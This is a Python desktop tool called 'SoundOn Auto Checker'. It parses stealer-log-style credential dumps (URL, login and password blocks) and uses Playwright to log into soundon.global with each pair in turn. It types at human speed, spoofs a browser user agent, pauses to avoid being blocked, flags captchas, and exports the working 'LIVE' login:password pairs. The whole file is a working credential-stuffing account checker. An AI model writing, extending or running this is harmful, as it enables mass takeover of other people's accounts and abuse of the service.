import asyncio
import re
import threading
import tkinter as tk
from tkinter import filedialog, ttk, messagebox
from dataclasses import dataclass
from typing import List, Tuple, Optional
import time

from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError


# ===================== CONFIG =====================
LOGIN_URL = "https://www.soundon.global/login?lang=en&region=VN"

HEADLESS = False
SLOW_MO = 80

NAV_TIMEOUT = 120_000
ACTION_TIMEOUT = 60_000

# Human-like delays (seconds)
DELAY_BEFORE_FILL = 3.0
DELAY_AFTER_FILL = 2.0
DELAY_AFTER_CLICK = 8.0
DELAY_BEFORE_CLOSE = 3.0  # Giảm thời gian chờ sau khi check thành công

# ✅ SELECTORS from your F12 screenshots
SEL_EMAIL = 'input[name="username"]'
SEL_PASS = 'input[data-id="password-input"]'
SEL_LOGIN_BTN = 'button:has-text("Log in")'


# ===================== DATA MODEL =====================
@dataclass
class Account:
    login: str
    password: str
    raw: str = ""


# ===================== PARSER (matches your file) =====================
def parse_accounts_from_text(text: str) -> Tuple[List[Account], List[str]]:
    lines = [ln.strip() for ln in text.splitlines()]
    lines = [ln for ln in lines if ln]

    url_re = re.compile(r"^🔗\s*URL:\s*(.+)$", re.IGNORECASE)
    login_re = re.compile(r"^👤\s*(Tên đăng nhập|Login):\s*(.*)$", re.IGNORECASE)
    pass_re = re.compile(r"^🔑\s*(Mật khẩu|Password):\s*(.*)$", re.IGNORECASE)
    sep_re = re.compile(r"^-{5,}$")

    valid: List[Account] = []
    invalid: List[str] = []
    block: List[str] = []

    def process_block(block_lines: List[str]):
        if not block_lines:
            return

        raw_block = "\n".join(block_lines)

        url_line = None
        login_line = None
        pass_line = None

        for ln in block_lines:
            m = url_re.match(ln)
            if m:
                url_line = m.group(1).strip()

            m = login_re.match(ln)
            if m:
                login_line = m.group(2).strip()

            m = pass_re.match(ln)
            if m:
                pass_line = m.group(2).strip()

        # Prefer explicit login/pass
        if login_line and pass_line:
            login_val = login_line.strip()
            pass_val = pass_line.strip()
            if login_val and login_val.lower() != "none" and pass_val:
                valid.append(Account(login=login_val, password=pass_val, raw=raw_block))
            else:
                invalid.append(raw_block)
            return

        # Fallback: parse URL
        if url_line:
            lowered = url_line.lower()
            pos_domain = lowered.find("soundon.global")

            if pos_domain != -1:
                after_domain = url_line[pos_domain + len("soundon.global"):]
                cred_pos = after_domain.find(":")
                if cred_pos == -1:
                    invalid.append(raw_block)
                    return
                cred_payload = after_domain[cred_pos + 1:].strip()
            else:
                tail = url_line.split("/")[-1]
                if ":" not in tail:
                    invalid.append(raw_block)
                    return
                cred_payload = tail.split(":", 1)[1].strip()

            parts = cred_payload.split(":")
            if len(parts) < 2:
                invalid.append(raw_block)
                return

            login_val = parts[0].strip()
            pass_val = ":".join(parts[1:]).strip()

            if login_val and login_val.lower() != "none" and pass_val:
                valid.append(Account(login=login_val, password=pass_val, raw=raw_block))
            else:
                invalid.append(raw_block)
            return

        invalid.append(raw_block)

    for ln in lines:
        if sep_re.match(ln):
            process_block(block)
            block = []
        else:
            block.append(ln)

    process_block(block)
    return valid, invalid


# ===================== PLAYWRIGHT HELPERS =====================
async def type_human(locator, text: str, delay_ms: int = 80):
    await locator.click()
    try:
        await locator.fill("")
    except Exception:
        pass
    await locator.type(text, delay=delay_ms)


# ===================== PLAYWRIGHT: SINGLE ACCOUNT TEST =====================
async def test_single_account(acc: Account) -> Tuple[bool, str]:
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=HEADLESS, slow_mo=SLOW_MO)
        context = await browser.new_context(
            locale="en-US",
            timezone_id="Asia/Ho_Chi_Minh",
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/122.0.0.0 Safari/537.36"
            ),
            viewport={"width": 1280, "height": 720},
        )

        page = await context.new_page()
        page.set_default_timeout(ACTION_TIMEOUT)

        try:
            await page.goto(LOGIN_URL, wait_until="commit", timeout=NAV_TIMEOUT)

            # ✅ Wait for correct visible inputs
            await page.wait_for_selector(f"{SEL_EMAIL}:visible", timeout=60_000)
            await page.wait_for_selector(f"{SEL_PASS}:visible", timeout=60_000)

            await page.wait_for_timeout(int(DELAY_BEFORE_FILL * 1000))

            email_input = page.locator(f"{SEL_EMAIL}:visible").first
            pass_input = page.locator(f"{SEL_PASS}:visible").first

            await type_human(email_input, acc.login, delay_ms=80)
            await type_human(pass_input, acc.password, delay_ms=80)

            await page.wait_for_timeout(int(DELAY_AFTER_FILL * 1000))

            login_btn = page.locator(f"{SEL_LOGIN_BTN}:visible").first
            await login_btn.click()

            await page.wait_for_timeout(int(DELAY_AFTER_CLICK * 1000))

            # Captcha / verification detection
            if await page.locator('iframe[src*="recaptcha"]').count() > 0:
                await page.wait_for_timeout(int(DELAY_BEFORE_CLOSE * 1000))
                return False, "CAPTCHA/Verification triggered"

            # Common error messages
            err = page.locator("text=/incorrect|invalid|wrong|failed|try again|error/i")
            if await err.count() > 0 and await err.first.is_visible():
                await page.wait_for_timeout(int(DELAY_BEFORE_CLOSE * 1000))
                return False, "Invalid credentials / login error"

            # Success heuristic
            url_now = page.url.lower()
            if "/login" not in url_now:
                # ✅ Tự động tắt trình duyệt khi live thành công
                await page.wait_for_timeout(int(DELAY_BEFORE_CLOSE * 1000))
                return True, f"Redirected: {page.url}"

            await page.wait_for_timeout(int(DELAY_BEFORE_CLOSE * 1000))
            return False, "Still on login page"

        except PlaywrightTimeoutError:
            return False, "Timeout"
        except Exception as e:
            return False, f"Error: {type(e).__name__}: {e}"
        finally:
            # ✅ Luôn đóng trình duyệt sau khi check xong
            try:
                await context.close()
                await browser.close()
            except Exception:
                pass


# ===================== UI APP =====================
class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("SoundOn Auto Checker")
        self.geometry("1400x780")

        self.accounts: List[Account] = []
        self.invalid_blocks: List[str] = []
        
        self.live: List[Tuple[Account, str]] = []
        self.die: List[Tuple[Account, str]] = []

        self.worker_thread: Optional[threading.Thread] = None
        self.is_checking = False
        self.current_checking_index = 0
        
        self._build_ui()

    def _build_ui(self):
        top = tk.Frame(self)
        top.pack(fill="x", padx=10, pady=8)

        tk.Button(top, text="Add file (.txt)", command=self.load_file).pack(side="left")
        
        # ✅ Đổi từ "Test Selected" thành "Start" 
        self.start_button = tk.Button(top, text="Start", command=self.start_check_all, 
                                     bg="green", fg="white", font=("Arial", 10, "bold"))
        self.start_button.pack(side="left", padx=8)
        
        # ✅ Thêm nút Stop
        self.stop_button = tk.Button(top, text="Stop", command=self.stop_checking,
                                    bg="red", fg="white", font=("Arial", 10, "bold"), state="disabled")
        self.stop_button.pack(side="left", padx=8)
        
        tk.Button(top, text="Export LIVE/DIE", command=self.export_results).pack(side="left")

        self.file_label = tk.Label(top, text="No file loaded", anchor="w")
        self.file_label.pack(side="left", padx=12)

        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=10, pady=10)

        accounts_frame = tk.Frame(nb)
        nb.add(accounts_frame, text="ACCOUNTS")

        self.accounts_table = ttk.Treeview(accounts_frame, columns=("login", "password", "status"), show="headings", height=18)
        self.accounts_table.heading("login", text="LOGIN")
        self.accounts_table.heading("password", text="PASSWORD")
        self.accounts_table.heading("status", text="STATUS")
        self.accounts_table.column("login", width=350)
        self.accounts_table.column("password", width=400)
        self.accounts_table.column("status", width=150)
        self.accounts_table.pack(fill="both", expand=True)

        live_frame = tk.Frame(nb)
        nb.add(live_frame, text="LIVE")

        self.live_table = ttk.Treeview(live_frame, columns=("login", "password", "reason"), show="headings")
        for col, w in [("login", 350), ("password", 400), ("reason", 380)]:
            self.live_table.heading(col, text=col.upper())
            self.live_table.column(col, width=w)
        self.live_table.pack(fill="both", expand=True)

        die_frame = tk.Frame(nb)
        nb.add(die_frame, text="DIE")

        self.die_table = ttk.Treeview(die_frame, columns=("login", "password", "reason"), show="headings")
        for col, w in [("login", 350), ("password", 400), ("reason", 380)]:
            self.die_table.heading(col, text=col.upper())
            self.die_table.column(col, width=w)
        self.die_table.pack(fill="both", expand=True)

        log_frame = tk.Frame(nb)
        nb.add(log_frame, text="LOG")

        self.log_text = tk.Text(log_frame, height=14)
        self.log_text.pack(fill="both", expand=True)

        self.status = tk.Label(self, text="Ready", anchor="w")
        self.status.pack(fill="x", padx=10, pady=(0, 8))
        
        # ✅ Thêm Progressbar
        self.progress = ttk.Progressbar(self, mode='determinate')
        self.progress.pack(fill="x", padx=10, pady=(0, 5))

    def log(self, msg: str):
        timestamp = time.strftime("%H:%M:%S")
        self.log_text.insert("end", f"[{timestamp}] {msg}\n")
        self.log_text.see("end")
        self.status.config(text=msg)

    def load_file(self):
        path = filedialog.askopenfilename(
            title="Select accounts file",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if not path:
            return

        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                text = f.read()
        except Exception as e:
            messagebox.showerror("Error", f"Could not read file:\n{e}")
            return

        accounts, invalid = parse_accounts_from_text(text)
        if not accounts:
            messagebox.showwarning("No accounts", "No valid accounts parsed from this file.")
            return

        self.accounts = accounts
        self.invalid_blocks = invalid

        self.file_label.config(text=path)
        self._render_accounts()
        self.log(f"✅ Loaded {len(accounts)} accounts | ⚠️ {len(invalid)} invalid blocks")
        
        # Reset progress
        self.progress['maximum'] = len(accounts)
        self.progress['value'] = 0

    def _render_accounts(self):
        for item in self.accounts_table.get_children():
            self.accounts_table.delete(item)
        for acc in self.accounts:
            self.accounts_table.insert("", "end", values=(acc.login, acc.password, "Not checked"))

    def update_account_status(self, index: int, status: str):
        """Cập nhật trạng thái của tài khoản trong bảng"""
        if index < len(self.accounts):
            item = self.accounts_table.get_children()[index]
            acc = self.accounts[index]
            self.accounts_table.item(item, values=(acc.login, acc.password, status))

    def _add_result(self, acc: Account, is_live: bool, reason: str):
        if is_live:
            self.live.append((acc, reason))
            self.live_table.insert("", "end", values=(acc.login, acc.password, reason))
            status = "✅ LIVE"
        else:
            self.die.append((acc, reason))
            self.die_table.insert("", "end", values=(acc.login, acc.password, reason))
            status = "❌ DIE"
        
        # Cập nhật trạng thái trong bảng accounts
        if acc in self.accounts:
            index = self.accounts.index(acc)
            self.update_account_status(index, status)

    def start_check_all(self):
        """Bắt đầu check tất cả tài khoản"""
        if not self.accounts:
            messagebox.showinfo("No file", "Please add a .txt file first.")
            return

        if self.is_checking:
            messagebox.showinfo("Already running", "Checking is already in progress.")
            return

        # Reset trạng thái
        self.live.clear()
        self.die.clear()
        for item in self.live_table.get_children():
            self.live_table.delete(item)
        for item in self.die_table.get_children():
            self.die_table.delete(item)
            
        # Cập nhật UI
        self._render_accounts()
        
        # Đặt cờ và bắt đầu
        self.is_checking = True
        self.current_checking_index = 0
        
        # Cập nhật nút
        self.start_button.config(state="disabled", bg="gray")
        self.stop_button.config(state="normal")
        
        self.log(f"🚀 Starting to check {len(self.accounts)} accounts...")
        
        # Bắt đầu thread
        self.worker_thread = threading.Thread(target=self._check_all_accounts, daemon=True)
        self.worker_thread.start()

    def _check_all_accounts(self):
        """Thread để check tất cả tài khoản"""
        for i, acc in enumerate(self.accounts):
            if not self.is_checking:
                break
                
            self.current_checking_index = i
            self.after(0, self.log, f"🔍 Checking {i+1}/{len(self.accounts)}: {acc.login}")
            
            # Cập nhật progress bar
            self.after(0, self.progress.config, {'value': i})
            
            # Check account
            ok, reason = asyncio.run(test_single_account(acc))
            
            # Cập nhật kết quả
            self.after(0, self._add_result, acc, ok, reason)
            
            # Log kết quả
            result_text = "✅ LIVE" if ok else "❌ DIE"
            self.after(0, self.log, f"  → {acc.login}: {result_text} ({reason})")
            
            # Delay nhẹ giữa các account để tránh bị block
            time.sleep(2)
        
        # Kết thúc
        self.after(0, self._checking_completed)

    def _checking_completed(self):
        """Khi hoàn thành check tất cả"""
        self.is_checking = False
        
        # Cập nhật UI
        self.start_button.config(state="normal", bg="green")
        self.stop_button.config(state="disabled")
        self.progress['value'] = len(self.accounts)
        
        self.log(f"🎉 Completed! LIVE: {len(self.live)} | DIE: {len(self.die)}")
        
        if len(self.live) > 0:
            messagebox.showinfo("Completed", f"Checking completed!\n\nLIVE: {len(self.live)}\nDIE: {len(self.die)}")
        else:
            messagebox.showwarning("Completed", f"Checking completed!\n\nNo LIVE accounts found!\nDIE: {len(self.die)}")

    def stop_checking(self):
        """Dừng quá trình check"""
        self.is_checking = False
        self.log("⏹️ Stopping checking process...")
        
        # Cập nhật UI
        self.start_button.config(state="normal", bg="green")
        self.stop_button.config(state="disabled")

    def export_results(self):
        if not (self.live or self.die):
            messagebox.showinfo("Nothing to export", "No results yet.")
            return

        out_dir = filedialog.askdirectory(title="Select folder to save results")
        if not out_dir:
            return

        live_path = f"{out_dir}/live.txt"
        die_path = f"{out_dir}/die.txt"

        try:
            with open(live_path, "w", encoding="utf-8") as f:
                for acc, reason in self.live:
                    f.write(f"{acc.login}:{acc.password}  # {reason}\n")

            with open(die_path, "w", encoding="utf-8") as f:
                for acc, reason in self.die:
                    f.write(f"{acc.login}:{acc.password}  # {reason}\n")

            messagebox.showinfo("Exported", f"Saved:\n{live_path}\n{die_path}")
        except Exception as e:
            messagebox.showerror("Export error", str(e))


if __name__ == "__main__":
    App().mainloop()